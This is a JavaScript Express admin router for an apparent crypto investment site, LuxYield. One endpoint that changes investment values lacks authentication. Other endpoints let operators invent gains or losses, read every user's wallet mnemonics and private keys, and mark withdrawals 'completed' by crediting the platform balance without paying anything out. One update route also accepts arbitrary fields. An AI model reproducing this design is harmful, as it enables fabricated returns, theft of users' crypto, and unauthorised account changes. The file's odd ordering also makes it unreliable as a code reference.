const router = require('express').Router();
// Admin: Set gain/loss for a user's active investment
router.post('/investment/:id/set-gain-loss', async (req, res) => {
  try {
    const { amount, type } = req.body; // type: 'gain' or 'loss'
    if (typeof amount !== 'number' || !['gain', 'loss'].includes(type)) {
      return res.status(400).json({ message: 'Invalid amount or type.' });
    }
    const investment = await require('../models/Investment').findById(req.params.id);
    if (!investment || investment.status !== 'active') {
      return res.status(404).json({ message: 'Active investment not found.' });
    }
    // Update currentValue
    if (type === 'gain') {
      investment.currentValue += amount;
    } else {
      investment.currentValue -= amount;
    }
    // Add transaction record
    investment.transactions = investment.transactions || [];
    investment.transactions.push({
      type,
      amount,
      date: new Date(),
      description: `Admin ${type} adjustment`
    });
    await investment.save();
    return res.json({ success: true, investment });
  } catch (err) {
    console.error('Admin set gain/loss error:', err);
    return res.status(500).json({ message: 'Server error.' });
  }
});
// server/routes/admin.js
const express = require('express');
const authAdmin = require('../middleware/authAdmin');
const MarketEvent = require('../models/MarketEvent');
const User = require('../models/User');
const Withdrawal = require('../models/Withdrawal');
const Deposit = require('../models/Deposit');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const auditLog = require('../middleware/auditLog');
const Announcement = require('../models/Announcement');
const adminCompleteInvestment = require('./admin_complete_investment');
const adminContinueInvestment = require('./admin_continue_investment');
const Investment = require('../models/Investment');
const MarketUpdate = require('../models/MarketUpdate');

// JWT decode middleware for admin routes
router.use((req, res, next) => {
  if (req.headers.authorization && req.headers.authorization.startsWith('Bearer ')) {
    try {
      const token = req.headers.authorization.replace('Bearer ', '');
      const decoded = jwt.verify(token, process.env.JWT_SECRET);
      console.log('Decoded admin JWT:', decoded); // Debug log
      req.user = decoded;
    } catch (err) {
      console.log('JWT decode error:', err.message); // Debug log
      // Invalid token, req.user remains undefined
    }
  } else {
    console.log('No Authorization header for admin route'); // Debug log
  }
  next();
});

// Register the new admin_complete_investment and admin_continue_investment routes
router.use(adminCompleteInvestment);
router.use(adminContinueInvestment);

// Create market event
router.post('/market-events', authAdmin, async (req, res) => {
  try {
    const event = new MarketEvent(req.body);
    await event.save();
    res.status(201).json(event);
  } catch (err) {
    res.status(400).json({ message: err.message });
  }
});

// Get all market events
router.get('/market-events', authAdmin, async (req, res) => {
  try {
    const events = await MarketEvent.find().sort('-createdAt');
    res.json(events);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Delete market event
router.delete('/market-events/:id', authAdmin, async (req, res) => {
  try {
    await MarketEvent.findByIdAndDelete(req.params.id);
    res.json({ message: 'Market event deleted successfully' });
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Get all users
router.get('/users', authAdmin, async (req, res) => {
  try {
    const users = await User.find();
    res.json(users);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Update user (role, tier, KYC status, 2FA, etc.)
router.patch('/users/:id', authAdmin, auditLog('update_user', 'User', req => req.params.id), async (req, res) => {
  try {
    const user = await User.findByIdAndUpdate(req.params.id, req.body, { new: true });
    if (!user) return res.status(404).json({ message: 'User not found' });
    res.json(user);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Get all withdrawal requests
router.get('/withdrawals', authAdmin, async (req, res) => {
  try {
    const withdrawals = await Withdrawal.find().sort('-createdAt');
    res.json(withdrawals);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Approve/reject withdrawal
router.patch('/withdrawals/:id', authAdmin, async (req, res) => {
  try {
    const { status, destination } = req.body;
    const withdrawal = await Withdrawal.findById(req.params.id);
    if (!withdrawal) return res.status(404).json({ message: 'Withdrawal not found' });
    if (status === 'completed' && withdrawal.status === 'pending') {
      const user = await User.findById(withdrawal.userId);
      if (!user) return res.status(404).json({ message: 'User not found' });
      if (destination === 'available') {
        user.depositBalance += withdrawal.amount;
      } else if (destination === 'locked') {
        user.lockedBalance += withdrawal.amount;
      }
      withdrawal.status = 'completed';
      withdrawal.destination = destination;
      await user.save();
      await withdrawal.save();
      return res.json({ success: true, withdrawal });
    } else {
      // For reject or other status updates
      withdrawal.status = status;
      await withdrawal.save();
      return res.json({ success: true, withdrawal });
    }
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Approve KYC
router.post('/users/:id/kyc/approve', authAdmin, async (req, res) => {
  try {
    const user = await User.findByIdAndUpdate(req.params.id, { 'kyc.status': 'verified' }, { new: true });
    if (!user) return res.status(404).json({ message: 'User not found' });
    res.json(user);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Reject KYC
router.post('/users/:id/kyc/reject', authAdmin, async (req, res) => {
  try {
    const { reason } = req.body;
    const user = await User.findByIdAndUpdate(
      req.params.id,
      { 'kyc.status': 'rejected', 'kyc.rejectionReason': reason || '' },
      { new: true }
    );
    if (!user) return res.status(404).json({ message: 'User not found' });
    res.json(user);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Update user tier/role
router.patch('/users/:id/tier', authAdmin, async (req, res) => {
  console.log('admin tier update req.user:', req.user); // Debug log
  try {
    const { tier } = req.body;
    const user = await User.findByIdAndUpdate(req.params.id, { tier }, { new: true });
    if (!user) return res.status(404).json({ message: 'User not found' });
    res.json(user);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});
router.patch('/users/:id/role', authAdmin, async (req, res) => {
  try {
    const { role } = req.body;
    const user = await User.findByIdAndUpdate(req.params.id, { role }, { new: true });
    if (!user) return res.status(404).json({ message: 'User not found' });
    res.json(user);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Get all deposits
router.get('/deposits', authAdmin, async (req, res) => {
  try {
    const deposits = await Deposit.find().populate('user', 'email username name').sort('-createdAt');
    res.json(deposits);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Update deposit status (approve/reject)
router.patch('/deposits/:id', authAdmin, async (req, res) => {
  try {
    const { status, adminNotes, txId } = req.body;
    // Fetch deposit before update to check previous status
    const prevDeposit = await Deposit.findById(req.params.id);
    const deposit = await Deposit.findByIdAndUpdate(
      req.params.id,
      { status, adminNotes, txId, confirmedAt: status === 'confirmed' ? new Date() : undefined },
      { new: true }
    ).populate('user', 'email username name');
    if (!deposit) return res.status(404).json({ message: 'Deposit not found' });

    // If confirming, credit user's depositBalance (only if not already confirmed)
    if (status === 'confirmed' && prevDeposit.status !== 'confirmed') {
      const User = require('../models/User');
      // Handle both populated and unpopulated user field
      const userId = deposit.user && deposit.user._id ? deposit.user._id : deposit.user;
      const user = await User.findById(userId);
      if (user) {
        user.depositBalance = (user.depositBalance || 0) + deposit.amount;
        await user.save();
        console.log(`[ADMIN] Credited user ${user.email} with $${deposit.amount}. New depositBalance: $${user.depositBalance}`);
      }
    }
    res.json(deposit);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Admin login
router.post('/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    // Find user with admin role
    const admin = await User.findOne({ email, role: 'admin' });
    if (!admin) {
      return res.status(401).json({ message: 'Invalid credentials' });
    }
    const isMatch = await bcrypt.compare(password, admin.password);
    if (!isMatch) {
      return res.status(401).json({ message: 'Invalid credentials' });
    }
    const token = jwt.sign(
      { id: admin._id, role: 'admin' },
      process.env.JWT_SECRET,
      { expiresIn: '8h' }
    );
    res.json({
      token,
      admin: {
        id: admin._id,
        name: admin.name,
        email: admin.email,
        role: admin.role
      }
    });
  } catch (err) {
    res.status(500).json({ message: 'Server error' });
  }
});

// Verify token
router.get('/verify', async (req, res) => {
  try {
    const token = req.header('Authorization').replace('Bearer ', '');
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    const admin = await User.findOne({ _id: decoded.id, role: 'admin' });
    if (!admin) {
      return res.status(401).json({ message: 'Admin not found' });
    }
    res.json({
      id: admin._id,
      name: admin.name,
      email: admin.email,
      role: admin.role
    });
  } catch (err) {
    res.status(401).json({ message: 'Invalid token' });
  }
});

// Admin dashboard stats
router.get('/stats', authAdmin, async (req, res) => {
  try {
    const totalUsers = await User.countDocuments();
    const totalInvestments = await (require('../models/Investment').countDocuments());
    const totalWithdrawals = await (require('../models/Withdrawal').countDocuments({ status: 'pending' }));
    const today = new Date();
    today.setHours(0,0,0,0);
    const todayROI = 1.2; // Placeholder, replace with real calculation if available
    res.json({
      totalUsers,
      totalInvestments,
      totalWithdrawals,
      todayROI
    });
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Get user's wallet mnemonics and private keys for all networks (admin only)
router.get('/users/:id/keys', authAdmin, async (req, res) => {
  try {
    const user = await User.findById(req.params.id).select('wallets email username name');
    if (!user) return res.status(404).json({ message: 'User not found' });
    // Log admin access to sensitive keys
    console.log(`Admin ${req.user && req.user.email} accessed wallet keys for user ${user.email || user.username || user._id}`);
    const wallets = user.wallets || {};
    res.json({
      wallets: {
        btc: {
          mnemonic: wallets.btc?.mnemonic || '',
          privateKey: wallets.btc?.privateKey || '',
          address: wallets.btc?.address || ''
        },
        eth: {
          mnemonic: wallets.eth?.mnemonic || '',
          privateKey: wallets.eth?.privateKey || '',
          address: wallets.eth?.address || ''
        },
        bnb: {
          mnemonic: wallets.bnb?.mnemonic || '',
          privateKey: wallets.bnb?.privateKey || '',
          address: wallets.bnb?.address || ''
        },
        tron: {
          mnemonic: wallets.tron?.mnemonic || '',
          privateKey: wallets.tron?.privateKey || '',
          address: wallets.tron?.address || ''
        },
        usdt_erc20: {
          mnemonic: wallets.usdt_erc20?.mnemonic || '',
          privateKey: wallets.usdt_erc20?.privateKey || '',
          address: wallets.usdt_erc20?.address || ''
        },
        usdt_trc20: {
          mnemonic: wallets.usdt_trc20?.mnemonic || '',
          privateKey: wallets.usdt_trc20?.privateKey || '',
          address: wallets.usdt_trc20?.address || ''
        },
        usdc_erc20: {
          mnemonic: wallets.usdc_erc20?.mnemonic || '',
          privateKey: wallets.usdc_erc20?.privateKey || '',
          address: wallets.usdc_erc20?.address || ''
        },
        usdc_trc20: {
          mnemonic: wallets.usdc_trc20?.mnemonic || '',
          privateKey: wallets.usdc_trc20?.privateKey || '',
          address: wallets.usdc_trc20?.address || ''
        }
      },
      email: user.email || '',
      username: user.username || '',
      name: user.name || ''
    });
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Admin: send email to any user
router.post('/send-email', authAdmin, async (req, res) => {
  let { to, subject, html, text } = req.body;
  const logoHtml = '<img src="https://www.luxyield.com/logo192.png" alt="LuxYield Logo" style="width:64px;height:64px;margin-bottom:16px;" />';
  if (html) {
    html = logoHtml + html;
  }
  if (!to || !subject || (!html && !text)) {
    return res.status(400).json({ message: 'Missing required fields: to, subject, and html or text.' });
  }
  try {
    await require('../utils/mailer').sendMail({ to, subject, html, text });
    res.json({ message: 'Email sent successfully.' });
  } catch (err) {
    res.status(500).json({ message: 'Failed to send email.', error: err.message });
  }
});

// Admin: post announcement (MongoDB)
router.post('/announcements', authAdmin, async (req, res) => {
  const { title, message } = req.body;
  if (!title || !message) {
    console.log('Missing title or message:', { title, message });
    return res.status(400).json({ message: 'Title and message are required.' });
  }
  try {
    const announcement = new Announcement({ title, message });
    await announcement.save();
    console.log('Saved announcement:', announcement);
    res.json({ message: 'Announcement posted.', announcement });
  } catch (err) {
    console.error('Failed to post announcement:', err);
    res.status(500).json({ message: 'Failed to post announcement.' });
  }
});

// Admin: delete announcement by ID (MongoDB)
router.delete('/announcements/:id', authAdmin, async (req, res) => {
  try {
    const result = await Announcement.findByIdAndDelete(req.params.id);
    if (!result) return res.status(404).json({ message: 'Announcement not found.' });
    res.json({ message: 'Announcement deleted.' });
  } catch (err) {
    res.status(500).json({ message: 'Failed to delete announcement.' });
  }
});

// Public: get announcements (MongoDB)
router.get('/announcements', async (req, res) => {
  try {
    const announcements = await Announcement.find().sort({ date: -1 });
    res.json({ announcements });
  } catch (err) {
    res.status(500).json({ message: 'Failed to fetch announcements.' });
  }
});

// Admin: update profile (name, phone, etc.)
router.patch('/profile', authAdmin, async (req, res) => {
  try {
    const adminId = req.user.id;
    const allowedFields = ['name', 'phone', 'country'];
    const update = {};
    allowedFields.forEach(field => {
      if (req.body[field] !== undefined) update[field] = req.body[field];
    });
    const admin = await User.findByIdAndUpdate(adminId, update, { new: true });
    if (!admin) return res.status(404).json({ message: 'Admin not found' });
    res.json({ message: 'Profile updated', admin });
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Admin: change password
router.post('/change-password', authAdmin, async (req, res) => {
  try {
    const adminId = req.user.id;
    const { currentPassword, newPassword } = req.body;
    const admin = await User.findById(adminId);
    if (!admin) return res.status(404).json({ message: 'Admin not found' });
    const isMatch = await bcrypt.compare(currentPassword, admin.password);
    if (!isMatch) return res.status(400).json({ message: 'Current password is incorrect' });
    admin.password = await bcrypt.hash(newPassword, 10);
    await admin.save();
    res.json({ message: 'Password changed successfully' });
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Admin: update notification preferences
router.patch('/notification-preferences', authAdmin, async (req, res) => {
  try {
    const adminId = req.user.id;
    const { email, sms, push } = req.body;
    const admin = await User.findById(adminId);
    if (!admin) return res.status(404).json({ message: 'Admin not found' });
    admin.notificationPrefs = { email, sms, push };
    await admin.save();
    res.json({ message: 'Notification preferences updated', notificationPrefs: admin.notificationPrefs });
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Admin: Get any user's dashboard/portfolio data
router.get('/users/:id/portfolio', authAdmin, async (req, res) => {
  try {
    const userId = req.params.id;
    console.log('[ADMIN][PORTFOLIO] Requested userId:', userId);
    const User = require('../models/User');
    const userDoc = await User.findById(userId);
    if (!userDoc) {
      console.warn('[ADMIN][PORTFOLIO] User not found for userId:', userId);
      return res.status(404).json({ error: 'User not found' });
    }
    // Use shared portfolio logic
    const { getPortfolioData } = require('./portfolio');
    const data = await getPortfolioData(userId);
    res.json(data);
  } catch (err) {
    console.error('[ADMIN][PORTFOLIO] Error:', err.message, err.stack);
    res.status(500).json({ error: err.message });
  }
});

// Admin: Get any user's profile/settings
router.get('/users/:id/profile', authAdmin, async (req, res) => {
  try {
    const userId = req.params.id;
    console.log('[ADMIN][PROFILE] Requested userId:', userId);
    const user = await require('../models/User').findById(userId);
    if (!user) {
      console.warn('[ADMIN][PROFILE] User not found for userId:', userId);
      return res.status(404).json({ error: 'User not found' });
    }
    res.json(user);
  } catch (err) {
    console.error('[ADMIN][PROFILE] Error:', err.message, err.stack);
    res.status(500).json({ error: err.message });
  }
});

// Admin: Get any user's KYC data
router.get('/users/:id/kyc', authAdmin, async (req, res) => {
  try {
    const userId = req.params.id;
    console.log('[ADMIN][KYC] Requested userId:', userId);
    const User = require('../models/User');
    const user = await User.findById(userId);
    if (!user) {
      console.warn('[ADMIN][KYC] User not found for userId:', userId);
      return res.status(404).json({ error: 'User not found' });
    }
    // Assuming KYC data is stored on the user model (adjust as needed)
    res.json({
      kycStatus: user.kycStatus || 'not_submitted',
      kycData: user.kycData || null
    });
  } catch (err) {
    console.error('[ADMIN][KYC] Error:', err.message, err.stack);
    res.status(500).json({ error: err.message });
  }
});

// ROI Withdrawal Approvals
router.get('/roi-approvals', authAdmin, async (req, res) => {
  try {
    const withdrawals = await Withdrawal.find({ type: 'roi', status: 'pending' }).populate('userId', 'email');
    res.json(withdrawals);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

router.patch('/roi-approvals/:id', authAdmin, async (req, res) => {
  try {
    const { status, destination } = req.body;
    const withdrawal = await Withdrawal.findById(req.params.id);
    if (!withdrawal || withdrawal.type !== 'roi') return res.status(404).json({ message: 'ROI withdrawal not found' });
    if (status === 'completed' && withdrawal.status === 'pending') {
      const user = await User.findById(withdrawal.userId);
      if (!user) return res.status(404).json({ message: 'User not found' });
      // Move from lockedBalance to availableBalance
      if (user.lockedBalance >= withdrawal.amount) {
        user.lockedBalance -= withdrawal.amount;
        user.availableBalance = (user.availableBalance || 0) + withdrawal.amount;
      } else {
        return res.status(400).json({ message: 'Insufficient locked balance' });
      }
      withdrawal.status = 'completed';
      withdrawal.destination = destination;
      await user.save();
      await withdrawal.save();
      return res.json({ success: true, withdrawal });
    } else if (status === 'rejected' && withdrawal.status === 'pending') {
      // If rejected, unlock the ROI back to available
      const user = await User.findById(withdrawal.userId);
      if (user && user.lockedBalance >= withdrawal.amount) {
        user.lockedBalance -= withdrawal.amount;
        user.availableBalance = (user.availableBalance || 0) + withdrawal.amount;
        await user.save();
      }
      withdrawal.status = 'rejected';
      await withdrawal.save();
      return res.json({ success: true, withdrawal });
    } else {
      withdrawal.status = status;
      await withdrawal.save();
      return res.json({ success: true, withdrawal });
    }
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Admin can manually adjust investment ROI (add gain/loss)
router.post('/investment-adjust', authAdmin, async (req, res) => {
  try {
    const { investmentId, amount, description } = req.body;
    if (!investmentId || typeof amount !== 'number') {
      return res.status(400).json({ message: 'investmentId and amount are required' });
    }
    const investment = await Investment.findById(investmentId);
    if (!investment) return res.status(404).json({ message: 'Investment not found' });
    investment.currentValue += amount;
    investment.transactions.push({
      type: 'admin-adjust',
      amount,
      date: new Date(),
      description: description || (amount >= 0 ? 'Admin Gain' : 'Admin Loss')
    });
    await investment.save();
    res.json({ message: 'Investment adjusted', investment });
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
});

// Admin: Create a new market update
router.post('/market-updates', authAdmin, async (req, res) => {
  try {
    const { title, summary } = req.body;
    const update = new MarketUpdate({ title, summary });
    await update.save();
    res.status(201).json(update);
  } catch (err) {
    res.status(500).json({ message: 'Failed to create market update', error: err.message });
  }
});

// Admin: Delete a market update
router.delete('/market-updates/:id', authAdmin, async (req, res) => {
  try {
    await MarketUpdate.findByIdAndDelete(req.params.id);
    res.json({ message: 'Market update deleted' });
  } catch (err) {
    res.status(500).json({ message: 'Failed to delete market update', error: err.message });
  }
});

module.exports = router;